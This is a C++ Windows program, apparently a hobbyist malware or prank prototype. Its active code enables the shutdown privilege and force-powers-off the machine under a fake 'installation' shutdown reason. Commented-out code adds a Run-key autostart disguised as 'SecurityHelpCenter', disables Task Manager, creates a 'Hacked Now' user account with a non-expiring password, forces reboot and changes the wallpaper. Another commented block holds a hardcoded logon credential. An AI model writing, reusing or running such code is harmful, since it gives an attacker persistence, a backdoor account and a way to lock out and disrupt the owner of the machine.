#include <Windows.h>
#include <WinUser.h>
#include <ConsoleApi.h>
#include <winreg.h>
#include <lmaccess.h>
#include <string>
#include <iostream>

#include <winbase.h>
#include <securitybaseapi.h>
#include <processthreadsapi.h>

using namespace std;

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Kernel32.lib")
#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Netapi32.lib")

int main() {

	/*HANDLE phandleToken;
	result = LogonUserA("Ahmed", NULL, "0123429320", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &phandleToken);

	if (result != 0) {
		result = ImpersonateLoggedOnUser(phandleToken);
		
		if (result != 0) {
			short result = ExitWindowsEx(EWX_POWEROFF | EWX_FORCEIFHUNG,
				SHTDN_REASON_MINOR_OTHER);
			cout << GetLastError() << endl;
		}
	}*/

	HANDLE phandleToken;
	LUID luid;
	TOKEN_PRIVILEGES privs;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &phandleToken);

	short result = LookupPrivilegeValue(NULL, L"SeShutdownPrivilege", &luid);

	privs.PrivilegeCount = 1;
	privs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	privs.Privileges[0].Luid = luid;

	result = AdjustTokenPrivileges(phandleToken, FALSE, &privs, 0, NULL, NULL);

	if (result == ERROR_SUCCESS)
	{
		cout << result << endl;
	}

	result = ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_INSTALLATION);

	cout << GetLastError() << endl;
}

//int main(int argc, char** argv) {
//
//	FreeConsole();
//	// startup setup
//	HKEY hkey = NULL;
//	LONG createStatus = RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
//	LONG status = RegSetValueExA(hkey, "SecurityHelpCenter", NULL, REG_SZ, (BYTE*)argv[0], (strlen(argv[0]) + 1) * sizeof(char));
//
//	// disable task manager
//	int value = 1;
//	HKEY hkey2 = NULL;
//	LONG openKeyResult = RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", NULL, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey2, NULL);
//	LONG disableTskMgr = RegSetValueExA(hkey2, "DisableTaskMgr", NULL, REG_DWORD, (BYTE*)&value, 4);
//	
//	// reboot the machine
//	/*int s = ExitWindowsEx(EWX_REBOOT | EWX_FORCEIFHUNG, SHTDN_REASON_MAJOR_OTHER);
//	cout << s << endl;*/
//
//	// create new user account
//	LPDWORD err = NULL;
//	_USER_INFO_1 userInfo = { 0 };
//	userInfo.usri1_name = new wchar_t[(strlen("Hacked Now") + 1) * sizeof(wchar_t)];
//	memcpy(userInfo.usri1_name, L"Hacked Now", (strlen("Hacked Now") + 1) * sizeof(wchar_t));
//
//	userInfo.usri1_password = new wchar_t[(strlen("hackednow") + 1) * sizeof(wchar_t)];
//	userInfo.usri1_priv = USER_PRIV_USER;
//	userInfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;
//
//	int result = NetUserAdd(NULL, 1, (LPBYTE)&userInfo, err);
//	cout << result << endl;
//
//	delete[] userInfo.usri1_name;
//
//	// changing the background of the system
//	char *fileName = (char*)"C:\\Users\\Ahmed\\Desktop\\imge.png";
//	result = SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, fileName, SPIF_SENDCHANGE);
//
//}